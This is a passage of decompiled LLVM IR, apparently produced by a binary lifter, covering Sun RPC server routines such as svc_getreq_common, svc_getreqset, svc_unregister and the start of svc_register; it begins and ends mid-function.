dec_label_pc_17814:                               ; preds = %dec_label_pc_17808
  %v1_17814 = add i32 %v0_17820, 8
  %v2_17814 = inttoptr i32 %v1_17814 to i32*
  %v3_17814 = load i32, i32* %v2_17814, align 4
  %v1_17818 = load i32, i32* @r4, align 4
  %v9_17818 = icmp eq i32 %v3_17814, %v1_17818
  br i1 %v9_17818, label %dec_label_pc_17814.dec_label_pc_17830_crit_edge, label %dec_label_pc_17820

dec_label_pc_17820:                               ; preds = %dec_label_pc_17808, %dec_label_pc_17814
  %v1_17824 = inttoptr i32 %v0_17820 to i32*
  %v2_17824 = load i32, i32* %v1_17824, align 4
  store i32 %v2_17824, i32* %r0.global-to-local, align 4
  %v2_17828 = icmp eq i32 %v2_17824, 0
  br i1 %v2_17828, label %dec_label_pc_17828.dec_label_pc_17830_crit_edge, label %dec_label_pc_17808

dec_label_pc_17828.dec_label_pc_17830_crit_edge:  ; preds = %dec_label_pc_17820
  br label %dec_label_pc_17830

dec_label_pc_17814.dec_label_pc_17830_crit_edge:  ; preds = %dec_label_pc_17814
  br label %dec_label_pc_17830

dec_label_pc_17830:                               ; preds = %dec_label_pc_17814.dec_label_pc_17830_crit_edge, %dec_label_pc_17828.dec_label_pc_17830_crit_edge, %entry
  %v0_17830 = phi i32 [ %v0_178305, %dec_label_pc_17814.dec_label_pc_17830_crit_edge ], [ %v0_17820, %dec_label_pc_17828.dec_label_pc_17830_crit_edge ], [ 0, %entry ]
  %v1_17830 = load i32, i32* @r5, align 4
  %v2_17830 = inttoptr i32 %v1_17830 to i32*
  store i32 %v0_17830, i32* %v2_17830, align 4
  %v2_17834 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17834, i32* @r4, align 4
  store i32 %v6_177e8, i32* @r5, align 4
  store i32 %v9_177e8, i32* @r6, align 4
  %v14_17834 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v14_17834

; uselistorder directives
  uselistorder i32 %v2_17824, { 1, 2, 0 }
  uselistorder i32 %v0_17820, { 0, 2, 3, 4, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_17820, { 1, 0 }
  uselistorder label %dec_label_pc_17808, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1296 = alloca i32, align 4
  %v3_17838 = load i32, i32* @r4, align 4
  %v2_1783c = ptrtoint i32* %stack_var_-1296 to i32
  store i32 %arg1, i32* @r4, align 4
  %v0_17850 = call i32 @__rpc_thread_variables()
  store i32 %v0_17850, i32* %r0.global-to-local, align 4
  %v1_17854 = add i32 %v0_17850, 180
  %v2_17854 = inttoptr i32 %v1_17854 to i32*
  %v3_17854 = load i32, i32* %v2_17854, align 4
  %v1_17858 = load i32, i32* @r4, align 4
  %v4_17858 = mul i32 %v1_17858, 4
  %v5_17858 = add i32 %v4_17858, %v3_17854
  %v6_17858 = inttoptr i32 %v5_17858 to i32*
  %v7_17858 = load i32, i32* %v6_17858, align 4
  store i32 %v7_17858, i32* @r4, align 4
  %v2_1785c = icmp eq i32 %v7_17858, 0
  store i32 %v0_17850, i32* %r6.global-to-local, align 4
  br i1 %v2_1785c, label %dec_label_pc_179cc, label %dec_label_pc_17868.preheader

dec_label_pc_17868.preheader:                     ; preds = %entry
  %v2_17868 = ptrtoint i32* %stack_var_-96 to i32
  %v2_1797c = ptrtoint i32* %stack_var_-48 to i32
  %v2_178a0 = ptrtoint i32* %stack_var_-496 to i32
  %v2_178c0 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_17868

dec_label_pc_17868:                               ; preds = %dec_label_pc_179c4.dec_label_pc_17868_crit_edge, %dec_label_pc_17868.preheader
  %v0_1786c = phi i32 [ %v0_1786c.pre, %dec_label_pc_179c4.dec_label_pc_17868_crit_edge ], [ %v7_17858, %dec_label_pc_17868.preheader ]
  %v1_1786c = add i32 %v0_1786c, 8
  %v2_1786c = inttoptr i32 %v1_1786c to i32*
  %v3_1786c = load i32, i32* %v2_1786c, align 4
  store i32 %v0_1786c, i32* %r0.global-to-local, align 4
  %v1_1787c = inttoptr i32 %v3_1786c to i32*
  %v2_1787c = load i32, i32* %v1_1787c, align 4
  call void @__pseudo_branch(i32 %v2_1787c)
  %v0_17880 = load i32, i32* %r0.global-to-local, align 4
  %v2_17880 = icmp eq i32 %v0_17880, 0
  br i1 %v2_17880, label %dec_label_pc_17998, label %dec_label_pc_17888

dec_label_pc_17888:                               ; preds = %dec_label_pc_17868
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  store i32 %tmp22, i32* %stack_var_-48, align 4
  store i32 %tmp36, i32* %ip.global-to-local, align 4
  %v0_178c8 = load i32, i32* @r4, align 4
  br i1 %v2_178c0, label %dec_label_pc_178d0, label %dec_label_pc_178e8

dec_label_pc_178d0:                               ; preds = %dec_label_pc_17888
  %v2_178d4 = load i32, i32* @global_var_2f610.862, align 4
  %v2_178d8 = add i32 %v0_178c8, 32
  %v3_178d8 = inttoptr i32 %v2_178d8 to i32*
  store i32 %v2_178d4, i32* %v3_178d8, align 4
  %v0_178e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_178e0 = add i32 %v0_178c8, 40
  %v3_178e0 = inttoptr i32 %v2_178e0 to i32*
  store i32 %v0_178e0, i32* %v3_178e0, align 4
  br label %dec_label_pc_1790c

dec_label_pc_178e8:                               ; preds = %dec_label_pc_17888
  store i32 %v2_1797c, i32* %r0.global-to-local, align 4
  %v12_178f0 = call i32 @_authenticate(i32 %v2_1797c, i32 %v2_17868, i32 %tmp26, i32 %tmp20, i32 %tmp22, i32 %tmp37, i32 %tmp20, i32 %tmp36, i32 %v2_1783c, i32 %tmp26, i32 %v2_178a0, i32 %v0_178c8)
  store i32 %v12_178f0, i32* %r0.global-to-local, align 4
  %v2_178f4 = icmp eq i32 %v12_178f0, 0
  br i1 %v2_178f4, label %dec_label_pc_1790c, label %dec_label_pc_178fc

dec_label_pc_178fc:                               ; preds = %dec_label_pc_178e8
  %v0_17900 = load i32, i32* @r4, align 4
  store i32 %v0_17900, i32* %r0.global-to-local, align 4
  %v2_17904 = call i32 @svcerr_auth(i32 %v0_17900, i32 %v12_178f0)
  store i32 %v2_17904, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17998

dec_label_pc_1790c:                               ; preds = %dec_label_pc_178e8, %dec_label_pc_178d0
  %v0_17910 = load i32, i32* %r6.global-to-local, align 4
  %v1_17910 = add i32 %v0_17910, 184
  %v2_17910 = inttoptr i32 %v1_17910 to i32*
  %v3_17910 = load i32, i32* %v2_17910, align 4
  store i32 %v3_17910, i32* %ip.global-to-local, align 4
  store i32 -1, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1795c2 = icmp eq i32 %v3_17910, 0
  br i1 %v2_1795c2, label %dec_label_pc_17964.thread, label %dec_label_pc_17920.lr.ph

dec_label_pc_17964.thread:                        ; preds = %dec_label_pc_1790c
  br label %dec_label_pc_17990

dec_label_pc_17920.lr.ph:                         ; preds = %dec_label_pc_1790c
  %v3_17924.pre = load i32, i32* %stack_var_-48, align 4
  br label %dec_label_pc_17920

dec_label_pc_17920:                               ; preds = %dec_label_pc_17920.lr.ph, %dec_label_pc_1795c
  %v0_1796413 = phi i32 [ 0, %dec_label_pc_17920.lr.ph ], [ %v0_1796412, %dec_label_pc_1795c ]
  %v1_1794c = phi i32 [ 0, %dec_label_pc_17920.lr.ph ], [ %v1_1794c10, %dec_label_pc_1795c ]
  %v0_17944 = phi i32 [ -1, %dec_label_pc_17920.lr.ph ], [ %v0_179447, %dec_label_pc_1795c ]
  %v0_17988 = phi i32 [ %v3_17910, %dec_label_pc_17920.lr.ph ], [ %v2_17958, %dec_label_pc_1795c ]
  %v1_17920 = add i32 %v0_17988, 4
  %v2_17920 = inttoptr i32 %v1_17920 to i32*
  %v3_17920 = load i32, i32* %v2_17920, align 4
  %v9_17928 = icmp eq i32 %v3_17920, %v3_17924.pre
  br i1 %v9_17928, label %dec_label_pc_17930, label %dec_label_pc_1795c

dec_label_pc_17930:                               ; preds = %dec_label_pc_17920
  %v1_17930 = add i32 %v0_17988, 8
  %v2_17930 = inttoptr i32 %v1_17930 to i32*
  %v3_17930 = load i32, i32* %v2_17930, align 4
  %v9_17938 = icmp eq i32 %v3_17930, %tmp37
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v9_17938, label %dec_label_pc_1797c, label %dec_label_pc_17944

dec_label_pc_17944:                               ; preds = %dec_label_pc_17930
  %v3_17944 = icmp ult i32 %v0_17944, %v3_17930
  br i1 %v3_17944, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_17944
  store i32 %v3_17930, i32* @r1, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_17944, %bb
  %v0_179448 = phi i32 [ %v0_17944, %dec_label_pc_17944 ], [ %v3_17930, %bb ]
  %v3_1794c = icmp uge i32 %v3_17930, %v1_1794c
  %v9_1794c = icmp eq i32 %v3_17930, %v1_1794c
  %v2_17950 = xor i1 %v9_1794c, true
  %v3_17950 = and i1 %v3_1794c, %v2_17950
  br i1 %v3_17950, label %bb43, label %bb44

bb43:                                             ; preds = %bb42
  br label %bb44

bb44:                                             ; preds = %bb42, %bb43
  %v1_1794c11 = phi i32 [ %v1_1794c, %bb42 ], [ %v3_17930, %bb43 ]
  %v2_17954 = xor i1 %v3_1794c, true
  %v3_17954 = or i1 %v9_1794c, %v2_17954
  br i1 %v3_17954, label %bb45, label %dec_label_pc_1795c

bb45:                                             ; preds = %bb44
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1795c

dec_label_pc_1795c:                               ; preds = %dec_label_pc_17920, %bb44, %bb45
  %v0_1796412 = phi i32 [ %v0_1796413, %dec_label_pc_17920 ], [ 1, %bb44 ], [ 1, %bb45 ]
  %v1_1794c10 = phi i32 [ %v1_1794c, %dec_label_pc_17920 ], [ %v1_1794c11, %bb44 ], [ %v1_1794c11, %bb45 ]
  %v0_179447 = phi i32 [ %v0_17944, %dec_label_pc_17920 ], [ %v0_179448, %bb44 ], [ %v0_179448, %bb45 ]
  %v1_17958 = inttoptr i32 %v0_17988 to i32*
  %v2_17958 = load i32, i32* %v1_17958, align 4
  store i32 %v2_17958, i32* %ip.global-to-local, align 4
  %v2_1795c = icmp eq i32 %v2_17958, 0
  br i1 %v2_1795c, label %dec_label_pc_17964, label %dec_label_pc_17920

dec_label_pc_17964:                               ; preds = %dec_label_pc_1795c
  %v2_17964 = icmp eq i32 %v0_1796412, 0
  br i1 %v2_17964, label %dec_label_pc_17990, label %dec_label_pc_1796c

dec_label_pc_1796c:                               ; preds = %dec_label_pc_17964
  store i32 %v1_1794c10, i32* @r2, align 4
  %v0_17970 = load i32, i32* @r4, align 4
  store i32 %v0_17970, i32* %r0.global-to-local, align 4
  %v1_17974 = call i32 @svcerr_progvers(i32 %v0_17970)
  store i32 %v1_17974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17998

dec_label_pc_1797c:                               ; preds = %dec_label_pc_17930
  store i32 %v2_1797c, i32* %r0.global-to-local, align 4
  %v1_17988 = add i32 %v0_17988, 12
  %v2_17988 = inttoptr i32 %v1_17988 to i32*
  %v3_17988 = load i32, i32* %v2_17988, align 4
  call void @__pseudo_branch(i32 %v3_17988)
  br label %dec_label_pc_17998

dec_label_pc_17990:                               ; preds = %dec_label_pc_17964.thread, %dec_label_pc_17964
  %v0_17990 = load i32, i32* @r4, align 4
  store i32 %v0_17990, i32* %r0.global-to-local, align 4
  %v1_17994 = call i32 @__GI_svcerr_noprog(i32 %v0_17990)
  store i32 %v1_17994, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17998

dec_label_pc_17998:                               ; preds = %dec_label_pc_17868, %dec_label_pc_1797c, %dec_label_pc_1796c, %dec_label_pc_178fc, %dec_label_pc_17990
  %v0_17998 = load i32, i32* @r4, align 4
  %v1_17998 = add i32 %v0_17998, 8
  %v2_17998 = inttoptr i32 %v1_17998 to i32*
  %v3_17998 = load i32, i32* %v2_17998, align 4
  store i32 %v0_17998, i32* %r0.global-to-local, align 4
  store i32 96680, i32* @lr, align 4
  %v1_179a4 = add i32 %v3_17998, 4
  %v2_179a4 = inttoptr i32 %v1_179a4 to i32*
  %v3_179a4 = load i32, i32* %v2_179a4, align 4
  call void @__pseudo_branch(i32 %v3_179a4)
  %v0_179a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_179a8 = icmp eq i32 %v0_179a8, 0
  br i1 %v2_179a8, label %dec_label_pc_179b0, label %dec_label_pc_179c4

dec_label_pc_179b0:                               ; preds = %dec_label_pc_17998
  %v0_179b0 = load i32, i32* @r4, align 4
  store i32 %v0_179b0, i32* %r0.global-to-local, align 4
  %v1_179b4 = add i32 %v0_179b0, 8
  %v2_179b4 = inttoptr i32 %v1_179b4 to i32*
  %v3_179b4 = load i32, i32* %v2_179b4, align 4
  store i32 96704, i32* @lr, align 4
  %v1_179bc = add i32 %v3_179b4, 20
  %v2_179bc = inttoptr i32 %v1_179bc to i32*
  %v3_179bc = load i32, i32* %v2_179bc, align 4
  call void @__pseudo_branch(i32 %v3_179bc)
  %v14_179d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_179cc

dec_label_pc_179c4:                               ; preds = %dec_label_pc_17998
  %v7_179c4 = icmp eq i32 %v0_179a8, 1
  br i1 %v7_179c4, label %dec_label_pc_179c4.dec_label_pc_17868_crit_edge, label %dec_label_pc_179cc

dec_label_pc_179c4.dec_label_pc_17868_crit_edge:  ; preds = %dec_label_pc_179c4
  %v0_1786c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17868

dec_label_pc_179cc:                               ; preds = %dec_label_pc_179c4, %entry, %dec_label_pc_179b0
  %v14_179d0 = phi i32 [ %v0_17850, %entry ], [ %v14_179d0.pre, %dec_label_pc_179b0 ], [ %v0_179a8, %dec_label_pc_179c4 ]
  store i32 %v3_17838, i32* @r4, align 4
  ret i32 %v14_179d0

; uselistorder directives
  uselistorder i32 %v2_17958, { 1, 2, 0 }
  uselistorder i1 %v9_1794c, { 1, 0 }
  uselistorder i32 %v3_17930, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_17944, { 2, 1, 0 }
  uselistorder i32 %v1_1794c, { 3, 2, 0, 1 }
  uselistorder i32 %v0_178c8, { 1, 2, 0 }
  uselistorder i32 %v0_1786c, { 1, 0 }
  uselistorder i32 %v2_1797c, { 2, 1, 0 }
  uselistorder i32 %tmp37, { 1, 0 }
  uselistorder i32 %tmp36, { 3, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 12, 8, 9, 10, 11, 14, 13, 19, 15, 16, 17, 18, 20, 0 }
  uselistorder label %dec_label_pc_179cc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17998, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_17990, { 1, 0 }
  uselistorder label %dec_label_pc_1795c, { 2, 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_17920, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v0_179e0 = call i32 @_rpc_dtablesize()
  %v0_179e4 = load i32, i32* @r4, align 4
  store i32 %v0_179e4, i32* @r6, align 4
  store i32 %v0_179e0, i32* @r8, align 4
  store i32 0, i32* @r7, align 4
  %v5_17a309 = icmp sgt i32 %v0_179e0, 0
  br i1 %v5_17a309, label %dec_label_pc_179f4, label %dec_label_pc_17a34

dec_label_pc_179f4:                               ; preds = %entry, %dec_label_pc_17a24
  %v0_179f4 = phi i32 [ %v1_17a24, %dec_label_pc_17a24 ], [ %v0_179e4, %entry ]
  %v1_179f4 = inttoptr i32 %v0_179f4 to i32*
  %v2_179f4 = load i32, i32* %v1_179f4, align 4
  store i32 %v2_179f4, i32* @r4, align 4
  %v1_17a1019 = call i32 @ffs(i32 %v2_179f4)
  store i32 %v1_17a1019, i32* @r5, align 4
  %v2_17a1421 = icmp eq i32 %v1_17a1019, 0
  %v0_17a1822 = load i32, i32* @r7, align 4
  %v2_17a1823 = add i32 %v1_17a1019, -1
  %v1_17a1c24 = add i32 %v2_17a1823, %v0_17a1822
  br i1 %v2_17a1421, label %dec_label_pc_17a24, label %dec_label_pc_179fc

dec_label_pc_179fc:                               ; preds = %dec_label_pc_179f4, %dec_label_pc_179fc
  %v1_17a1c25 = phi i32 [ %v1_17a1c, %dec_label_pc_179fc ], [ %v1_17a1c24, %dec_label_pc_179f4 ]
  %v1_179fc = call i32 @svc_getreq_common(i32 %v1_17a1c25)
  %v0_17a00 = load i32, i32* @r5, align 4
  %v1_17a00 = add i32 %v0_17a00, -1
  %v0_17a08 = load i32, i32* @r4, align 4
  %v7_17a08 = shl i32 1, %v1_17a00
  %v8_17a08 = xor i32 %v0_17a08, %v7_17a08
  store i32 %v8_17a08, i32* @r4, align 4
  %v1_17a10 = call i32 @ffs(i32 %v8_17a08)
  store i32 %v1_17a10, i32* @r5, align 4
  %v2_17a14 = icmp eq i32 %v1_17a10, 0
  %v0_17a18 = load i32, i32* @r7, align 4
  %v2_17a18 = add i32 %v1_17a10, -1
  %v1_17a1c = add i32 %v2_17a18, %v0_17a18
  br i1 %v2_17a14, label %dec_label_pc_17a24, label %dec_label_pc_179fc

dec_label_pc_17a24:                               ; preds = %dec_label_pc_179fc, %dec_label_pc_179f4
  %v0_17a18.lcssa = phi i32 [ %v0_17a1822, %dec_label_pc_179f4 ], [ %v0_17a18, %dec_label_pc_179fc ]
  %v1_17a1c.lcssa = phi i32 [ %v1_17a1c24, %dec_label_pc_179f4 ], [ %v1_17a1c, %dec_label_pc_179fc ]
  %v0_17a24 = load i32, i32* @r6, align 4
  %v1_17a24 = add i32 %v0_17a24, 4
  store i32 %v1_17a24, i32* @r6, align 4
  %v1_17a28 = add i32 %v0_17a18.lcssa, 32
  store i32 %v1_17a28, i32* @r7, align 4
  %v1_17a2c = load i32, i32* @r8, align 4
  %v5_17a30 = icmp slt i32 %v1_17a28, %v1_17a2c
  br i1 %v5_17a30, label %dec_label_pc_179f4, label %dec_label_pc_17a34

dec_label_pc_17a34:                               ; preds = %dec_label_pc_17a24, %entry
  %v20_17a34 = phi i32 [ %v0_179e0, %entry ], [ %v1_17a1c.lcssa, %dec_label_pc_17a24 ]
  ret i32 %v20_17a34

; uselistorder directives
  uselistorder i32 %v1_17a28, { 1, 0 }
  uselistorder i32 %v1_17a24, { 1, 0 }
  uselistorder i32 %v8_17a08, { 1, 0 }
  uselistorder i32 (i32)* @ffs, { 1, 0 }
  uselistorder label %dec_label_pc_179fc, { 1, 0 }
  uselistorder label %dec_label_pc_179f4, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_17a38 = load i32, i32* @lr, align 4
  store i32 %v0_17a38, i32* %stack_var_-4, align 4
  %v6_17a38 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %entry, %dec_label_pc_17a4c
  %v5_17a5c4 = phi i32 [ %v6_17a38, %entry ], [ %v5_17a5c, %dec_label_pc_17a4c ]
  %v2_17a50 = add i32 %v5_17a5c4, -128
  %v3_17a50 = inttoptr i32 %v2_17a50 to i32*
  store i32 0, i32* %v3_17a50, align 4
  %v0_17a58.pre = load i32, i32* %r2.global-to-local, align 4
  %v7_17a58 = icmp eq i32 %v0_17a58.pre, 31
  %v2_17a5c = and i32 %v0_17a58.pre, 1073741824
  %v4_17a5c = mul i32 %v0_17a58.pre, 4
  %v5_17a5c = add i32 %v4_17a5c, %v6_17a38
  %v1_17a60 = add i32 %v0_17a58.pre, 1
  store i32 %v1_17a60, i32* %r2.global-to-local, align 4
  %v2_17a64 = icmp eq i32 %v2_17a5c, 0
  %v3_17a64 = or i1 %v7_17a58, %v2_17a64
  br i1 %v3_17a64, label %dec_label_pc_17a4c, label %dec_label_pc_17a68

dec_label_pc_17a68:                               ; preds = %dec_label_pc_17a4c
  %v0_17a6c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_17a6c, i32* %stack_var_-132, align 4
  %v6_17a70 = call i32 @svc_getreqset(i32* nonnull %stack_var_-132, i32 %v5_17a5c, i32 %v1_17a60, i32 %v6_17a38, i32 %v0_17a6c)
  ret i32 %v6_17a70

; uselistorder directives
  uselistorder i32 %v0_17a58.pre, { 2, 1, 0, 3 }
  uselistorder i32 %v6_17a38, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_17a4c, { 1, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v3_17a7c = load i32, i32* @r4, align 4
  %v6_17a7c = load i32, i32* @r5, align 4
  %v9_17a7c = load i32, i32* @r6, align 4
  %v12_17a7c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_17a90 = call i32 @svc_find(i32 %arg1, i32 %arg2, i32* nonnull %stack_var_-24)
  store i32 %v4_17a90, i32* @r4, align 4
  %v2_17a94 = icmp eq i32 %v4_17a90, 0
  br i1 %v2_17a94, label %dec_label_pc_17ad4, label %dec_label_pc_17a9c

dec_label_pc_17a9c:                               ; preds = %entry
  %v2_17a9c = load i32, i32* %stack_var_-24, align 4
  %v1_17aa0 = inttoptr i32 %v4_17a90 to i32*
  %v2_17aa0 = load i32, i32* %v1_17aa0, align 4
  store i32 %v2_17aa0, i32* @r5, align 4
  %v2_17aa4 = icmp eq i32 %v2_17a9c, 0
  br i1 %v2_17aa4, label %dec_label_pc_17ab0, label %bb

bb:                                               ; preds = %dec_label_pc_17a9c
  %v3_17aa8 = inttoptr i32 %v2_17a9c to i32*
  store i32 %v2_17aa0, i32* %v3_17aa8, align 4
  br label %dec_label_pc_17ab8

dec_label_pc_17ab0:                               ; preds = %dec_label_pc_17a9c
  %v0_17ab0 = call i32 @__rpc_thread_variables()
  %v0_17ab4 = load i32, i32* @r5, align 4
  %v2_17ab4 = add i32 %v0_17ab0, 184
  %v3_17ab4 = inttoptr i32 %v2_17ab4 to i32*
  store i32 %v0_17ab4, i32* %v3_17ab4, align 4
  br label %dec_label_pc_17ab8

dec_label_pc_17ab8:                               ; preds = %bb, %dec_label_pc_17ab0
  %v0_17abc = load i32, i32* @r4, align 4
  store i32 %v0_17abc, i32* @r0, align 4
  %v2_17ac0 = inttoptr i32 %v0_17abc to i32*
  store i32 0, i32* %v2_17ac0, align 4
  %v0_17ac4 = call i32 @free()
  %v0_17ac8 = load i32, i32* @r6, align 4
  %v0_17acc = load i32, i32* @r7, align 4
  %v2_17ad0 = call i32 @__GI_pmap_unset(i32 %v0_17ac8, i32 %v0_17acc)
  br label %dec_label_pc_17ad4

dec_label_pc_17ad4:                               ; preds = %entry, %dec_label_pc_17ab8
  %v17_17ad8 = phi i32 [ 0, %entry ], [ %v2_17ad0, %dec_label_pc_17ab8 ]
  store i32 %v3_17a7c, i32* @r4, align 4
  store i32 %v6_17a7c, i32* @r5, align 4
  store i32 %v9_17a7c, i32* @r6, align 4
  store i32 %v12_17a7c, i32* @r7, align 4
  ret i32 %v17_17ad8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_17ad4, { 1, 0 }
  uselistorder label %dec_label_pc_17ab8, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %v0_17aec1 = call i32 @__rpc_thread_variables()
  %v1_17af02 = add i32 %v0_17aec1, 184
  %v2_17af03 = inttoptr i32 %v1_17af02 to i32*
  %v3_17af04 = load i32, i32* %v2_17af03, align 4
  %v2_17af46 = icmp eq i32 %v3_17af04, 0
  br i1 %v2_17af46, label %dec_label_pc_17afc, label %dec_label_pc_17ae4

dec_label_pc_17ae4:                               ; preds = %entry, %dec_label_pc_17ae4
  %v0_17ae4 = phi i32 [ %v3_17af0, %dec_label_pc_17ae4 ], [ %v3_17af04, %entry ]
  %v1_17ae4 = add i32 %v0_17ae4, 4
  %v2_17ae4 = inttoptr i32 %v1_17ae4 to i32*
  %v3_17ae4 = load i32, i32* %v2_17ae4, align 4
  %v4_17ae4 = add i32 %v0_17ae4, 8
  %v5_17ae4 = inttoptr i32 %v4_17ae4 to i32*
  %v6_17ae4 = load i32, i32* %v5_17ae4, align 4
  %v2_17ae8 = call i32 @svc_unregister(i32 %v3_17ae4, i32 %v6_17ae4)
  %v0_17aec = call i32 @__rpc_thread_variables()
  %v1_17af0 = add i32 %v0_17aec, 184
  %v2_17af0 = inttoptr i32 %v1_17af0 to i32*
  %v3_17af0 = load i32, i32* %v2_17af0, align 4
  %v2_17af4 = icmp eq i32 %v3_17af0, 0
  br i1 %v2_17af4, label %dec_label_pc_17afc, label %dec_label_pc_17ae4

dec_label_pc_17afc:                               ; preds = %dec_label_pc_17ae4, %entry
  %v0_17aec.lcssa = phi i32 [ %v0_17aec1, %entry ], [ %v0_17aec, %dec_label_pc_17ae4 ]
  ret i32 %v0_17aec.lcssa

; uselistorder directives
  uselistorder i32 %v3_17af0, { 1, 0 }
  uselistorder i32 %v0_17ae4, { 1, 0 }
  uselistorder label %dec_label_pc_17ae4, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg5, i32* @sl, align 4
  %v4_17b28 = call i32 @svc_find(i32 %arg2, i32 %arg3, i32* nonnull %stack_var_-32)
  %v2_17b2c = icmp eq i32 %v4_17b28, 0
  br i1 %v2_17b2c, label %dec_label_pc_17b48, label %dec_label_pc_17b38

dec_label_pc_17b38:                               ; preds = %entry
  %v1_17b38 = add i32 %v4_17b28, 12
  %v2_17b38 = inttoptr i32 %v1_17b38 to i32*
  %v3_17b38 = load i32, i32* %v2_17b38, align 4
  %v1_17b3c = load i32, i32* @r7, align 4
  %v9_17b3c = icmp eq i32 %v3_17b38, %v1_17b3c
  br i1 %v9_17b3c, label %dec_label_pc_17b68, label %dec_label_pc_17b94

dec_label_pc_17b48:                               ; preds = %entry
  %v1_17b48 = call i32 @malloc(i32 16)
  store i32 %v1_17b48, i32* @r4, align 4
  %v2_17b4c = icmp eq i32 %v1_17b48, 0
  br i1 %v2_17b4c, label %dec_label_pc_17b94, label %dec_label_pc_17b54

dec_label_pc_17b54:                               ; preds = %dec_label_pc_17b48
  %v1_17b54 = add i32 %v1_17b48, 4
  %v2_17b54 = inttoptr i32 %v1_17b54 to i32*
  %v3_17b54 = load i32, i32* @r5, align 4
  store i32 %v3_17b54, i32* %v2_17b54, align 4
  %v4_17b54 = add i32 %v1_17b48, 8
  %v5_17b54 = inttoptr i32 %v4_17b54 to i32*
  %v6_17b54 = load i32, i32* @r6, align 4
  store i32 %v6_17b54, i32* %v5_17b54, align 4
  %v7_17b54 = add i32 %v1_17b48, 12
  %v8_17b54 = inttoptr i32 %v7_17b54 to i32*
  %v9_17b54 = load i32, i32* @r7, align 4
  store i32 %v9_17b54, i32* %v8_17b54, align 4
  %v0_17b58 = call i32 @__rpc_thread_variables()
  %v1_17b5c = add i32 %v0_17b58, 184
  %v2_17b5c = inttoptr i32 %v1_17b5c to i32*
  %v3_17b5c = load i32, i32* %v2_17b5c, align 4
  %v1_17b60 = load i32, i32* @r4, align 4
  %v2_17b60 = inttoptr i32 %v1_17b60 to i32*
  store i32 %v3_17b5c, i32* %v2_17b60, align 4
  %v0_17b64 = load i32, i32* @r4, align 4
  store i32 %v0_17b64, i32* %v2_17b5c, align 4
  br label %dec_label_pc_17b68

dec_label_pc_17b68:                               ; preds = %dec_label_pc_17b38, %dec_label_pc_17b54
  %v0_17b68 = load i32, i32* @sl, align 4
  %v2_17b68 = icmp eq i32 %v0_17b68, 0
  br i1 %v2_17b68, label %dec_label_pc_17b98, label %dec_label_pc_17b7c

dec_label_pc_17b7c:                               ; preds = %dec_label_pc_17b68
  %v0_17b70 = load i32, i32* @r6, align 4
  %v0_17b6c = load i32, i32* @r5, align 4
  %v0_17b7c = load i32, i32* @r8, align 4
  %v1_17b7c = add i32 %v0_17b7c, 5
  %v2_17b7c = inttoptr i32 %v1_17b7c to i8*
